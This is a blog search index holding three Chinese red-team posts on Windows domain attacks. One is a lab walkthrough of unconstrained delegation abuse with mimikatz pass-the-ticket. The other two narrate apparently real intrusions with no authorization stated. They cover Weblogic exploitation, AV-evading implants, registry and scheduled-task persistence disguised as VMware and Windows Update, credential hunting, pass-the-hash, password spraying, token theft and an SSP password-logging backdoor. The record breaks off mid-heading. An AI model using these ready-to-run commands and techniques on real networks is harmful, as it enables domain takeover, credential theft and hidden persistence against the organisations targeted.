<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域渗透之非约束委派攻击</title>
      <link href="/2021/08/02/Unconstrained-delegation-attack/"/>
      <url>/2021/08/02/Unconstrained-delegation-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>域委派分为三种：</p><ul><li>第一种：约束委派</li><li>第二种：非约束委派</li><li>第三种、资源委派</li></ul><blockquote><p>用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的TGT发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务</p></blockquote><h2 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h2><h3 id="当前域环境"><a href="#当前域环境" class="headerlink" title="当前域环境"></a>当前域环境</h3><p>域控：<code>motoo\administrator</code>（192.168.2.42）<br>域内主机（配置了非约束性委派）：<code>motoo\saulGoodman</code>（192.168.2.40）</p><h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>首先创建一个非约束委派账户，注册 <code>SPN</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A MSSQLSvc/mssql.motoo.nc:1433 saul</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/hSZjxv.jpg"><br>然后需要把委派属性打开：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PgIN92.jpg"><br>当服务账号或者主机被设置为非约束性委派时，其 <code>userAccountControl</code> 属性会包含 <code>TRUSTED_FOR_DELEGATION</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8NPyDK.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/16fgwr.jpg"></p><h3 id="查找域内非约束委派用户和计算机"><a href="#查找域内非约束委派用户和计算机" class="headerlink" title="查找域内非约束委派用户和计算机"></a>查找域内非约束委派用户和计算机</h3><p>发现域内主机主机我一般是使用 <code>LDAP</code>，可以使用如下方式：<br>Adfind 下载地址：<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Adfind 使用参数：</span><br><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br><span class="line">-b：指定要查询的根节点</span><br><span class="line">-f：LDAP过滤条件</span><br><span class="line">attr list：需要显示的属性</span><br></pre></td></tr></table></figure><p>例如需要查询当前域内的非约束委派用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=motoo,DC=nc&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Y6Sjlg.jpg"><br>可以看到 <code>saul</code> 这个用户就是域内非约束委派用户！<br>查找非约束委派用户的工具还有很多！例如 Adfind、ldapdomaindump、PowerView … 等等，我最常用的只有 <code>Adfind</code>。</p><h3 id="非约束委派攻击利用"><a href="#非约束委派攻击利用" class="headerlink" title="非约束委派攻击利用"></a>非约束委派攻击利用</h3><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/hiZCeN.jpg"><br>非约束委派：当 <code>user</code> 访问 <code>service1</code> 时，如果 <code>service1</code> 的服务账号开启了 <code>unconstrained delegation</code>（非约束委派），则当 <code>user</code> 访问 <code>service1</code> 时会将 <code>user</code> 的 <code>TGT</code> 发送给 <code>service1</code> 并保存在内存中以备下次重用，然后 <code>service1</code> 就可以利用这张<code>TGT</code> 以 <code>user </code>的身份去访问域内的任何服务（任何服务是指<code>user</code>能访问的服务）<br>流程如下:</p><ol><li>用户向KDC请求可转发TGT，记为TGT1</li><li>KDC返回TGT1</li><li>用户通过TGT1向KDC请求转发TGT2</li><li>KDC返回TGT2</li><li>用户通过TGT1向KDC申请访问服务1的RST</li><li>KDC返回RST</li><li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li><li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li><li>KDC给服务1返回服务2的RST</li><li>服务1以用户名义向服务2发出请求</li><li>服务2响应服务1的请求</li><li>服务1响应用户第7步骤的请求</li></ol><p>这个流程有一个问题：<code>TGT2</code>是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。攻击其实就是利用的这点，使用从高权限账户处得到的<code>TGT</code>去获取权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前域：motoo.nc</span><br><span class="line">域控主机名：Motoo-DCSRV（IP：192.168.2.42）、用户 motoo\administrator（win2008）</span><br><span class="line">域内主机名：Motoo-IISWEB（IP：192.168.2.40）、用户 motoo\saulGoodman   （win2012 R2）</span><br></pre></td></tr></table></figure><p>在 Windows 系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的！<br>现在我们将 <code>Motoo-DBSRV</code> 这个主机用户设置为非约束委派（注意是：主机用户而不是服务用户）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pf6wDV.jpg"><br>当 <code>Motoo-DBSRV</code> 机器上设置了非约束委派。使用 <code>dc</code> 或者域管，去登录 <code>Motoo-DBSRV</code> ，可在 <code>Motoo-DBSRV</code> 上留存票据凭证，然后需要让域控模拟访问被设置了非约束委派的机器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName Motoo-IISWeb</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eWm4AF.jpg"><br>注意：如果遇到这种情况需要开启 <code>wmirm</code> 端口：（原因是 <code>wmi</code> 版本太老了，需要加 <code>-Port</code> 指定端口，老版本的 <code>wmi</code> 端口是 <code>80</code>）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/qm7iSu.jpg"><br>使用命令行打开 <code>wmi</code> 服务：（需要管理员权限）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinRM QuickConfig  (y)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ipdNtC.jpg"><br>又或者 <code>services.msc</code> 手动打开：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/E8UT7R.jpg"><br>配置好后查看是否有回显，如果有就说明开启成功了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm enumerate winrm/config/listener</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Lj2qrr.jpg"><br>域控模拟访问被设置了约束委派的机器后，这个时候其实域管理员的 <code>TGT</code> 已经缓存在 <code>Motoo-IISWeb</code> 机器上了。<br>先清除一下当前票据缓存：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;kerberos::purge&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/499b99.jpg"><br>然后我们就可以使用 <code>mimikatz</code> 即 <code>dump</code> 所有票据出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /<span class="built_in">export</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wGUx4O.jpg"><br>这个时候 <code>[0;15ac7e]-2-0-40e00000-Administrator@krbtgt-MOTOO.NC.kirbi</code> 就是域管理 <code>administrator</code> 的 <code>TGT</code> ！<br>我们现在访问域控肯定是访问不了的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/DJTgeN.jpg"><br>这个时候就就需要通过 <code>ptt</code> 将 <code>TGT</code> 注入到当前会话中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;15ac7e]-2-0-40e00000-Administrator@krbtgt-MOTOO.NC.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/VUJDg9.jpg"><br>这个时候就能访问到域控了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pHc9xG.jpg"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 委派攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透不用进程窃取如何横向 Bypass Psexec AV 拿到域控?</title>
      <link href="/2021/07/15/redTeam-2/"/>
      <url>/2021/07/15/redTeam-2/</url>
      
        <content type="html"><![CDATA[<h2 id="作战前期"><a href="#作战前期" class="headerlink" title="作战前期"></a>作战前期</h2><p>在一次渗透中，打算遇见域环境的话不能靠<code>窃取进程</code>这种骚操作来打，只能使用域渗透的姿势：<code>委派</code>、<code>spn</code> … 这些操作来打。</p><h3 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h3><p>要求：拿到内网核心数据，以及人员架构，梳理分析，域内成员分析<br><code>c2</code> 准备阶段，使用 <code>poshc2</code> ，<code>CobaltStrike</code> + <code>混淆免杀</code>，<code>Metasploit</code> + <code>流量混淆编码</code>。<br>总体分为以下阶段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">入口权限维持阶段</span><br><span class="line">核心人员定位</span><br><span class="line">重要业务定位</span><br><span class="line">用户日志分析</span><br><span class="line">域内后门持久化</span><br><span class="line">痕迹清理</span><br><span class="line">域渗透阶段</span><br></pre></td></tr></table></figure><h2 id="找到-Weblogic-执行命令口子"><a href="#找到-Weblogic-执行命令口子" class="headerlink" title="找到 Weblogic 执行命令口子"></a>找到 Weblogic 执行命令口子</h2><p>首先是找到了一个 <code>Weblogic</code> 的反序列化命令执行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1zG1OX.png"><br>随后写了一个免杀一句话方便连接 <code>webshell</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/FmKRoo.png"><br>通过查看进程发现有 <code>VIPRE Internet Security</code> 杀毒：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7DHRYJ.jpg"><br>因为事先我就做好了免杀的 <code>exe</code>，随后直接 <code>Bypass</code> AV 后直接上线到 <code>CobaltStrike</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/HOxlwX.png"><br>初步发现当前机器是一个域机器：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2aUwbu.png"><br><code>JuicyPotato</code> (ms16-075)  提权到 <code>SYSTEM</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dgs4Z2.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MxN85G.png"><br>拿到 <code>SYSYEM</code> 权限后我立马做了一个权限维持：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">自启动：</span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /V <span class="string">&quot;VMwareTools&quot;</span> /t REG_SZ /F /D <span class="string">&quot;C:\temp\ma.exe&quot;</span></span><br><span class="line">    </span><br><span class="line">计划任务：</span><br><span class="line">schtasks /create /RL HIGHEST /F /tn <span class="string">&quot;Windows Server Update&quot;</span> /tr <span class="string">&quot;C:\temp\ma.exe&quot;</span> /sc DAILY /mo 1 /ST 09:00 /RU SYSTEM</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/k9mrtL.jpg"></p><h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><p>知道了当前是域环境，那么就对域进行信息搜集吧！<br>首先是查看了下当前域管有哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line"></span><br><span class="line">Administrator            BLombardo                caroot                   </span><br><span class="line">CThomas                  dbagent                  EFisher                  </span><br><span class="line">PSAdmin                  SMSUSER                  sqladmin </span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dcb3BC.png"><br>再查看当前域控是哪些机器，然后定位域控的 <code>IP</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain</span><br><span class="line"></span><br><span class="line">xxxDC1$ 192.168.0.6                  </span><br><span class="line">xxxDC2$192.168.0.13</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/u4w5Q1.png"><br>由于当前 <code>ip</code> 是 <code>10</code> 这个网段，而域控是 <code>192</code> 这个网段，猜测会有多网段：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CdiFLG.png"><br>由于当前进程是有域管进程的，可以直接拿到域控，我之前写的文章也讲过怎么拿，在这里几句不多阐述。<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3aFTd9.png"><br>由于不能用进程窃取这个骚操作拿到域控，那按照老传统来打吧！<br>由于当前机器是 <code>Windows 2012</code> 不能直接抓到明文，只能获取到 <code>Hash</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/zYU3xV.png"><br>且当前 <code>Hash</code> 也解密不出来：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/P6B63Z.png"><br>只能通过 <code>Hash The Pass</code> 这种方式来横向移动！<br>看了看 <code>10</code> 这个段的 <code>B</code> 段存活机器很少：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8GAXLI.png"><br>看 <code>192</code> 这个网段发现存活机器很多：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Z6UFhs.jpg"><br>本来想翻翻敏感文件看看有没有密码文件等等，这里教大家一个单靠命令对系统文件进行搜集的技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir /s /b <span class="string">&quot;*pass*&quot;</span> <span class="string">&quot;*user*&quot;</span> <span class="string">&quot;*config*&quot;</span> <span class="string">&quot;username.*&quot;</span> <span class="string">&quot;password.*&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/OOo3Yy.jpg"></p><h3 id="漏洞探测信息搜集"><a href="#漏洞探测信息搜集" class="headerlink" title="漏洞探测信息搜集"></a>漏洞探测信息搜集</h3><p>通过对 <code>192</code> 和 <code>10</code> 网段存活的主机探测发现有 <code>0708</code>、<code>永恒之蓝</code>有以下机器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">永恒之蓝：</span><br><span class="line">192.168.0.6(Windows Server 2012 R2 Datacenter 9600) stays <span class="keyword">in</span> safety</span><br><span class="line">192.168.0.13(Windows Server 2012 R2 Standard 9600) stays <span class="keyword">in</span> safety</span><br><span class="line"></span><br><span class="line">0708:</span><br><span class="line">192.168.0.74 - SAFE - CredSSP/NLA required</span><br><span class="line">192.168.0.13 - SAFE - Target appears patched</span><br><span class="line">192.168.0.34 - SAFE - CredSSP/NLA required</span><br><span class="line">192.168.0.28 - SAFE - CredSSP/NLA required</span><br><span class="line">192.168.0.6 - SAFE - CredSSP/NLA required</span><br></pre></td></tr></table></figure><p>至此信息搜集差不多了，进行下一步横向移动。</p><h2 id="内网横向移动-Bypass-AV"><a href="#内网横向移动-Bypass-AV" class="headerlink" title="内网横向移动 Bypass AV"></a>内网横向移动 Bypass AV</h2><p>通过 <code>PTH</code> 对 <code>10</code> 网段的机器，成功拿到了多台机器权限：（有些没成功的应该是被 <code>AV</code> 拦截了）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ouUKOL.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/vkPof3.png"><br>随后对这些主机进行信息搜集，看看有没有密码文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/vEi9t2.png"><br>密码文件倒是没找到，但是看上去这个域已经被大哥来过！字典文件都直接放到目标系统，小伙子你不讲武德啊！<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/nZUSUY.png"><br>随后我通过 <code>Mimikatz</code> 抓密码，成功拿到个明文：（当前机器是 <code>Windows 2012</code> 看来已经被大哥修改过注册表了）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/rfcVJp.png"><br>通过拿到当前密码去横向密码喷洒：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/F0jW7L.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/uMUawJ.png"><br>这不就横向出来了吗？大量机器密码都相同！其实域控两台密码也是这个！<br>由于当前内网是有 <code>VIPRE</code> AV 的，不能使用常规的 <code>Psexec</code> 和 <code>WMI</code>，不然必被拦截！这个时候我使用我插件里的工具进行 <code>Psexec</code>：(其实有很多工具都可以实现 <code>Bypass</code> AV 横向 <code>psexec</code> 的，我只写了一个(github上的项目)，有空再加上去发出来给兄弟们)<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/368uEn.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/aY6ZGW.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wK1ckl.png"><br>成功 <code>Bypass</code> 完成命令执行！既然域控（<code>192.168.0.6</code>、<code>192.168.0.13</code>）的密码也是这个密码，我们也可以通过相同的密码对他们进行横向移动：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/GSjagN.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/w0Sjhb.png"><br>两个域控都拿到执行命令的权限了，就不上线到 <code>CobaltStrike</code> 了，太简单了。<br><code>CobaltStrike</code> 这工具还是太变态了，有手就能打穿内网域，还是少用这玩意虽然方便，但是很多原理和攻击手法不懂那就 GG了，下次写实战文章我打算少用 <code>CobaltStrike</code> 来打内网，尽量让 XD 们都了解内网域渗透的攻击手法和原理！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> redTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> redTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次小型 APT 内网域渗透</title>
      <link href="/2021/07/04/apt-redteam-1/"/>
      <url>/2021/07/04/apt-redteam-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在内网渗透中拿到了域控就结束了吗？但实际上内网渗透中拿到域控才刚开始！如果是做 APT 需要对某个目标、某个部门、某个部门中的某个人进行渗透，这个时候就需要长时间去了解这个内网环境，对域内进行定向打击，需要花很长时间去熟悉一个内网框架的！所以说内网渗透的本质其实就是信息搜集。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先是拿到了一个 <code>webshell</code>，目标当前机器无 <code>AV</code> ，然后上 <code>powershell</code> 弹到了 <code>CobaltStrike</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dSVxoo.png"><br>通过信息搜集发现是有域环境的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/hmqFjS.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UtzF9C.png"></p><h2 id="令牌窃取拿到域控"><a href="#令牌窃取拿到域控" class="headerlink" title="令牌窃取拿到域控"></a>令牌窃取拿到域控</h2><p>在域渗透中有很多方式能够快速拿到域控，在本篇就写如何令牌窃取快速拿域控权限，以后有机会在写其他手段！<br>查询域管理员有两个用户：<code>x10</code> 、<code>Administrator</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CmIqfP.png"><br>查询域控制器发现有多台：<code>xxxxx-PDM$</code>  、<code>xxxxx-SERVER$</code> 、<code>xxx-DC$</code>、 <code>xx-SERVER$</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">```    </span><br><span class="line">![](https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CJbbHM.png)</span><br><span class="line">`ping` 域控的主机名分别得到了他们的 `IP`：</span><br><span class="line">```bash</span><br><span class="line">xxxxx-PDM192.168.2.105</span><br><span class="line">xxxxx-SERVER192.168.2.106</span><br><span class="line">xxx-DC192.168.2.107</span><br><span class="line">xx-SERVER192.168.2.104</span><br></pre></td></tr></table></figure><p>随后通过 <code>ms16-075</code> 提权到 <code>SYSTEM</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/X5sAse.png"><br>然后做了一个定时任务保持权限不丢失 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell  schtasks /create /RL HIGHEST /F /tn <span class="string">&quot;Windows Server Update&quot;</span> /tr <span class="string">&quot;c:\windows\Temp\Cha\64.exe&quot;</span> /sc DAILY /mo 1 /ST 09:00 /RU SYSTEM</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/GXfWLf.png"><br>一般拿到一台机器的权限后立即做好权限维持，还有就是马上把当前机器里的各种文件、浏览器数据翻个底朝天（除了那些可能保存在浏览器中的账号密码，还有那些像浏览器收藏夹及历史记录里的一些内网铭感资产的链接也会对我们有所帮助）<br>通过把当前机器文件翻遍后找到了一些账号密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mssql：</span><br><span class="line">User ID=sa;Password=xxxxxxx</span><br><span class="line"></span><br><span class="line">门禁：</span><br><span class="line">user：admin，pass：xxxxxxxx</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Vc1nJP.png"><br>还可以通过 <code>GPP</code>、查看核心机器共享文件里面有什么，这里主要是域控：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/YUuIXv.png"><br>可以看到共享组策略目录中其实包含里很多东西，一些域管理员可能会利用它对域内用户登陆时进行一些初始化操作，所以我们在域渗透的过程中首先都会去看看这个地方，看看有没有什么敏感信息文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/y9EyO8.png"><br>但是在本机器上没有翻到有价值的共享文件！之后通过查看当前机器有域管进程：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/SOTfIn.png"><br>随即注入进程让域管上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/VM35Nx.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/z30GmA.png"><br>域管和域控建立 <code>IPC</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.2.105</span><br><span class="line">net use \\192.168.2.106</span><br><span class="line">net use \\192.168.2.107</span><br><span class="line">net use \\192.168.2.104</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1cVG8I.png"><br>直接拿到四个域控：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\192.168.2.105\c$</span><br><span class="line">shell dir \\192.168.2.106\c$</span><br><span class="line">shell dir \\192.168.2.107\c$</span><br><span class="line">shell dir \\192.168.2.104\c$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ikgl0f.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/EO66Rt.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/N25UUo.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KtgM39.png"><br>通过扫描内网存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4XTv9K.png"><br>然后通过中转让域控上线把：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Vx6Qc1.png"><br>成功拿到域控：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/WkLC3Y.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/6IiBAE.png"><br>这域基本上已经死了。</p><h2 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h2><p>为了能够长时间控制到当前域控，我留下了两个后门：<code>SSP</code>、<code>Skeleton Key</code> 。</p><h3 id="SSP-记录登陆到当前机器的所有账号密码"><a href="#SSP-记录登陆到当前机器的所有账号密码" class="headerlink" title="SSP 记录登陆到当前机器的所有账号密码"></a>SSP 记录登陆到当前机器的所有账号密码</h3><p><code>SSP</code> 即 <code>Security Support Provider</code>，通俗理解就是一个用于身份验证的 <code>dll</code> , 系统在启动时 <code>SSP</code> 会被加载到 <code>lsass.exe</code> 进程中 , 由于 <code>lsa</code> 可扩展 , 导致在系统启动时我们完全可以加载一个自定义的 <code>dll</code> , 比如 , 一个用于记录所有登录到当前系统的明文账号密码的 <code>dll</code>。<br>通过拿到域控，我留了一个 <code>SSP</code> 后门：目标无需重启，立即记录密码信息，如果当前机器重启则失效！直接注入 <code>ssp</code>，因为当前机器无杀软，实际情况下需要注意杀软情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz privilege::debug</span><br><span class="line">beacon&gt; mimikatz misc::memssp</span><br><span class="line">beacon&gt; shell <span class="built_in">type</span> C:\Windows\System32\mimilsa.log</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fgT5eL.png"><br>等待了许久终于有人登陆当前机器成功获取到了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4vAvAX.png"></p><h3 id="Skeleton-Key-万能密码后门"><a href="#Skeleton-Key-万能密码后门" class="headerlink" title="Skeleton Key - 万能密码后门"></a>Skeleton Key - 